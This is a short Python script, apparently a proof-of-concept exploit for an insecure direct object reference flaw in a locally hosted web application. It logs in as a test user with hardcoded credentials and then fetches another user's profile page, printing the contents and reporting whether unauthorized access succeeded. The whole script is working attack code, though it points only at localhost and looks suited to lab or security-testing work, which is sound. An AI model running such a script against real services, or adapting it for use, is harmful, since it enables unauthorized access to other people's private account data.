import requests

BASE_URL = "http://127.0.0.1:5000"

session = requests.Session()

login_data = {
    "username": "tester",
    "password": "noctihex123"
}

response = session.post(
    f"{BASE_URL}/login",
    data=login_data,
    allow_redirects=True
)

if response.status_code != 200:
    print("[-] Login failed")
    raise SystemExit(1)

target = session.get(
    f"{BASE_URL}/profile/2"
)

if target.status_code == 200:
    print("[+] IDOR request succeeded")
    print(target.text)
else:
    print("[-] Failed to access target profile")